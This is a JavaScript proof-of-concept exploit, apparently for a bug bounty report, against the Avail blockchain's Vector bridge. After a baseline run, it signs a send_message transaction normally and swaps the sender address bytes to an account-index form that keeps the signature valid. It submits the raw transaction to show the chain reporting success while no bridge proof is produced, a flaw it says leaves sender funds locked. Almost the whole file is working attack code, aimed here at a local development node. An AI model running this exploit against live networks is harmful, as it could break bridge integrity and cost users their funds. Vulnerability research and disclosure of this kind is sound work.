/**
 * BONDA PoC — MultiAddress::Index Bridge Proof Omission
 *
 * Proof:
 *   When Vector::send_message is signed and submitted with MultiAddress::Index(n),
 *   the runtime resolves the account normally via pallet_indices → executes successfully → MessageSubmitted event
 *   BUT avail-core MaybeCaller::caller() returns None for the Index variant
 *   → filter_vector_call: let from = *caller?.as_ref() → ? returns None → bridge message dropped
 *   → no bridge proof in kate_queryDataProof
 *
 * Code references:
 *   avail-core/core-node-12/core/src/asdr.rs — caller() only returns Some for Id
 *   runtime/src/transaction_filter.rs:127    — caller? drops the message
 *
 * Since the address is not included in the SCALE signing payload,
 * signing with Address::Id and then swapping only the address bytes to Index keeps the signature valid.
 */
"use strict";

const sdk = require("avail-js-sdk");
const { compactToU8a, u8aToHex, hexToU8a } = require("@polkadot/util");

const WS  = process.env.WS_URL  || "ws://localhost:9944";
const RPC = process.env.RPC_URL || "http://localhost:9944";

function rpcPost(method, params) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify({ jsonrpc: "2.0", id: 1, method, params });
    const url = new URL(RPC);
    const mod = url.protocol === "https:" ? require("node:https") : require("node:http");
    const opts = {
      hostname: url.hostname,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      path: url.pathname || "/",
      method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) },
    };
    const req = mod.request(opts, (res) => {
      let data = "";
      res.on("data", d => data += d);
      res.on("end", () => { try { resolve(JSON.parse(data)); } catch(e) { reject(e); } });
    });
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

async function submitAndWait(api, tx, account) {
  return new Promise((resolve, reject) => {
    tx.signAndSend(account, ({ status, events, dispatchError }) => {
      if (dispatchError) {
        if (dispatchError.isModule) {
          const d = api.registry.findMetaError(dispatchError.asModule);
          return reject(new Error(`DispatchError: ${d.section}.${d.name}`));
        }
        return reject(new Error(`DispatchError: ${dispatchError}`));
      }
      if (status.isInBlock) resolve({ blockHash: status.asInBlock.toHex(), events });
    }).catch(reject);
  });
}

function txIndexFromEvents(events) {
  for (const { event, phase } of events) {
    if (phase.isApplyExtrinsic &&
        event.section === "system" &&
        (event.method === "ExtrinsicSuccess" || event.method === "ExtrinsicFailed")) {
      return phase.asApplyExtrinsic.toNumber();
    }
  }
  return -1;
}

async function waitFinalized(api, blockHash) {
  for (let i = 0; i < 30; i++) {
    const finalHead = await api.rpc.chain.getFinalizedHead();
    const finalNum = (await api.rpc.chain.getHeader(finalHead)).number.toNumber();
    const blockNum  = (await api.rpc.chain.getHeader(blockHash)).number.toNumber();
    if (finalNum >= blockNum) return;
    await new Promise(r => setTimeout(r, 1000));
  }
  console.log("  (finalization timeout)");
}

/**
 * Takes an extrinsic hex signed with Address::Id(accountId) and
 * returns the hex with the address swapped to Address::Index(index).
 *
 * SCALE UncheckedExtrinsic structure:
 *   [compact_len] [version:0x84] [MultiAddress] [sig:64b] [extra] [call]
 *
 * MultiAddress::Id  = 0x00 + 32 bytes (33 bytes total)
 * MultiAddress::Index = 0x01 + compact<u32>  (index 0 = 0x00, 2 bytes total)
 *
 * Since the address is not part of the signing payload, the signature remains valid after the swap.
 */
function swapAddressToIndex(signedHex, accountIndex) {
  const bytes = hexToU8a(signedHex);

  // 1. Parse the compact length prefix (first 1-4 bytes)
  let prefixLen = 1;
  const mode = bytes[0] & 0x03;
  if (mode === 0x00) prefixLen = 1;
  else if (mode === 0x01) prefixLen = 2;
  else if (mode === 0x02) prefixLen = 4;
  else prefixLen = 1 + (bytes[0] >> 2); // big-int mode, very rare

  let offset = prefixLen;

  // 2. version byte (0x84)
  if (bytes[offset] !== 0x84) {
    throw new Error(`unexpected version byte: 0x${bytes[offset].toString(16)}`);
  }
  offset++;

  // 3. MultiAddress::Id = 0x00 + 32 bytes
  if (bytes[offset] !== 0x00) {
    throw new Error(`address is not Id variant (byte: 0x${bytes[offset].toString(16)})`);
  }
  const idAddrLen = 33; // 0x00 + 32 bytes

  // 4. MultiAddress::Index(n) = 0x01 + compact u32
  const compactIndex = compactToU8a(accountIndex);
  const indexAddr = new Uint8Array([0x01, ...compactIndex]);

  // 5. New body = version_byte + indexAddr + sig + extra + call
  const body = new Uint8Array([
    bytes[prefixLen],                              // version 0x84
    ...indexAddr,                                  // Index address
    ...bytes.slice(prefixLen + 1 + idAddrLen),     // sig + extra + call
  ]);

  // 6. New compact length prefix
  const newLenPrefix = compactToU8a(body.length);
  const result = new Uint8Array([...newLenPrefix, ...body]);
  return u8aToHex(result);
}

async function main() {
  console.log("=".repeat(64));
  console.log("BONDA PoC — MultiAddress::Index Bridge Proof Omission");
  console.log("=".repeat(64));

  const api = await sdk.initialize(WS);
  const keyring = new sdk.polkadotApi.Keyring({ type: "sr25519" });
  const alice = keyring.addFromUri("//Alice");

  console.log(`\nChain: ${(await api.rpc.system.chain()).toHuman()}  specVersion: ${api.runtimeVersion.specVersion.toNumber()}`);
  console.log(`Alice: ${alice.address}`);

  // ── STEP 1: sudo to add domain 1 to the whitelist ─────────────────────────────
  console.log("\n" + "─".repeat(64));
  console.log("[STEP 1] sudo: set whitelisted domains = [1]");
  try {
    const setDomains = api.tx.vector.setWhitelistedDomains([1]);
    const sudoTx = api.tx.sudo.sudo(setDomains);
    const { blockHash } = await submitAndWait(api, sudoTx, alice);
    console.log(`  done in block: ${blockHash}`);
  } catch (e) {
    console.log(`  (skipped or failed: ${e.message})`);
  }

  // ── STEP 2: Alice claims account index 0 ─────────────────────────────────
  console.log("\n" + "─".repeat(64));
  console.log("[STEP 2] Alice claims account index 0");
  try {
    const claimTx = api.tx.indices.claim(0);
    const { blockHash } = await submitAndWait(api, claimTx, alice);
    console.log(`  done in block: ${blockHash}`);
  } catch (e) {
    if (e.message.includes("NotFree") || e.message.includes("InUse") || e.message.includes("already")) {
      console.log("  (index 0 already claimed, continuing)");
    } else {
      throw e;
    }
  }

  // Verify index 0 → Alice mapping
  const indexEntry = await api.query.indices.accounts(0);
  console.log(`  indices[0] = ${indexEntry.toHuman()}`);

  // ── BASELINE: send_message with Address::Id (normal path) ─────────────────────
  console.log("\n" + "─".repeat(64));
  console.log("[BASELINE] send_message with Address::Id (normal path)");
  console.log("  expect: MessageSubmitted event ✓ + kate bridge proof ✓");

  const msg   = api.createType("Message", { ArbitraryMessage: "0x424f4e4441" });
  const toH256 = "0x0000000000000000000000000000000000000000000000000000000000000001";
  const domain = 1;

  const baselineTx = api.tx.vector.sendMessage(msg, toH256, domain);
  const { blockHash: bh0, events: ev0 } = await submitAndWait(api, baselineTx, alice);
  const txIdx0 = txIndexFromEvents(ev0);
  const msgEv0 = ev0.find(e => e.event.section === "vector" && e.event.method === "MessageSubmitted");
  console.log(`  MessageSubmitted: ${msgEv0 ? "YES ✓" : "NO ✗"}  txIndex: ${txIdx0}  block: ${bh0}`);
  console.log("  waiting finalization...");
  await waitFinalized(api, bh0);
  const proof0 = await rpcPost("kate_queryDataProof", [txIdx0, bh0]);
  const ok0 = !proof0.error && proof0.result != null;
  console.log(`  kate_queryDataProof: ${ok0 ? "PROOF EXISTS ✓" : "MISSING ✗ — " + JSON.stringify(proof0.error || proof0.result)}`);

  // ── ATTACK: send_message with Address::Index(0) ────────────────────────────
  console.log("\n" + "─".repeat(64));
  console.log("[ATTACK] send_message with Address::Index(0)");
  console.log("  Address::Index → caller() = None → bridge message dropped from DA");
  console.log("  expect: MessageSubmitted event ✓ + kate bridge proof ✗ (MISSING)");

  // 1) Collect signing material such as nonce, era, genesis
  const attackCall = api.tx.vector.sendMessage(msg, toH256, domain);
  const nonce = (await api.query.system.account(alice.address)).nonce.toNumber();
  const blockHash = await api.rpc.chain.getBlockHash();
  const genesisHash = api.genesisHash;
  const runtimeVersion = api.runtimeVersion;

  // 2) Sign with the normal Id address → get hex
  const normalSigned = await attackCall.signAsync(alice, {
    nonce,
    era: api.createType("ExtrinsicEra", { current: (await api.rpc.chain.getHeader(blockHash)).number.toNumber(), period: 64 }),
    blockHash,
    genesisHash,
    runtimeVersion,
  });
  const normalHex = normalSigned.toHex();
  console.log(`\n  Normal (Id)  signed hex prefix: ${normalHex.slice(0, 30)}...`);

  // 3) Swap the address bytes → Index(0)
  const attackHex = swapAddressToIndex(normalHex, 0);
  console.log(`  Attack (Index) hex prefix:       ${attackHex.slice(0, 30)}...`);
  console.log(`  Address byte changed: 0x00(Id) → 0x01 0x00(Index 0)`);

  // 4) Submit the raw extrinsic
  let attackResult;
  try {
    attackResult = await rpcPost("author_submitExtrinsic", [attackHex]);
  } catch (e) {
    console.log(`  submission error: ${e.message}`);
    await sdk.disconnect();
    process.exit(1);
  }

  if (attackResult.error) {
    console.log(`\n  ✗ Extrinsic rejected: ${JSON.stringify(attackResult.error)}`);
    console.log("  → runtime validates Address::Index signer. Precondition not met.");
    await sdk.disconnect();
    process.exit(0);
  }

  console.log(`\n  tx hash: ${attackResult.result}`);
  console.log("  waiting for inclusion...");

  // 5) Wait for block inclusion
  let attackBlockHash = null;
  let attackTxIdx = -1;
  let attackEvents = null;

  await new Promise((resolve) => {
    const unsub = api.rpc.chain.subscribeNewHeads(async (header) => {
      const blockHash = header.hash.toHex();
      const block = await api.rpc.chain.getBlock(blockHash);
      const exts = block.block.extrinsics;
      for (let i = 0; i < exts.length; i++) {
        if (exts[i].hash.toHex() === attackResult.result) {
          attackBlockHash = blockHash;
          attackTxIdx = i;
          // Fetch events
          const events = await api.query.system.events.at(blockHash);
          attackEvents = events.filter(({ phase }) =>
            phase.isApplyExtrinsic && phase.asApplyExtrinsic.toNumber() === i
          );
          (await unsub)();
          resolve();
          return;
        }
      }
    });
    setTimeout(resolve, 30000); // 30s timeout
  });

  if (!attackBlockHash) {
    console.log("  ✗ tx not found in blocks within timeout");
    await sdk.disconnect();
    process.exit(1);
  }

  console.log(`  included in block: ${attackBlockHash}  txIndex: ${attackTxIdx}`);

  const msgEvAttack = attackEvents && attackEvents.find(({ event }) =>
    event.section === "vector" && event.method === "MessageSubmitted"
  );
  console.log(`  MessageSubmitted event: ${msgEvAttack ? "YES ✓  ← runtime says success" : "NO ✗"}`);

  // 6) Check kate proof
  console.log("  waiting finalization...");
  await waitFinalized(api, attackBlockHash);
  const proofAttack = await rpcPost("kate_queryDataProof", [attackTxIdx, attackBlockHash]);
  const okAttack = !proofAttack.error && proofAttack.result != null;

  // ── RESULT ───────────────────────────────────────────────────────────────
  console.log("\n" + "=".repeat(64));
  console.log("RESULT");
  console.log("=".repeat(64));
  console.log(`\n  BASELINE (Address::Id):`);
  console.log(`    MessageSubmitted: ${msgEv0 ? "YES ✓" : "NO ✗"}`);
  console.log(`    kate bridge proof: ${ok0 ? "EXISTS ✓" : "MISSING ✗"}`);
  console.log(`\n  ATTACK  (Address::Index(0)):`);
  console.log(`    MessageSubmitted: ${msgEvAttack ? "YES ✓  ← chain says bridge msg sent" : "NO ✗"}`);
  console.log(`    kate bridge proof: ${okAttack ? "EXISTS ✓ (not reproduced)" : "MISSING ✗  ← DATA NOT IN BRIDGE PROOF"}`);

  if (msgEvAttack && !okAttack) {
    console.log("\n✅ CONFIRMED — MultiAddress::Index bridge proof omission reproduced");
    console.log("   specVersion 51, commit 510ee26");
    console.log("\n   Impact: A bridge relayer watching MessageSubmitted events would");
    console.log("   attempt to relay a message with no on-chain bridge proof.");
    console.log("   Sender funds are locked on Avail side, no verifiable proof exists.");
    console.log("\n   Root cause (avail-core core-node-12/core/src/asdr.rs):");
    console.log("     fn caller() { match addr { Id(ref id) => Some(id), _ => None } }");
    console.log("   runtime/src/transaction_filter.rs:127:");
    console.log("     let from = *caller?.as_ref();  // None → drops bridge leaf");
  } else if (!msgEvAttack) {
    console.log("\n⚠️  MessageSubmitted did not fire — execution failed.");
    console.log("   Runtime rejected the Index-addressed extrinsic or domain/message was invalid.");
    console.log("   The caller() = None vulnerability remains code-confirmed but needs further setup.");
  } else {
    console.log("\n⚠️  Unexpected: proof found for Index-addressed tx. Investigate.");
  }

  console.log("─".repeat(64));
  await sdk.disconnect();
  process.exit(0);
}

main().catch(e => {
  console.error("\nError:", e.message || e);
  process.exit(1);
});
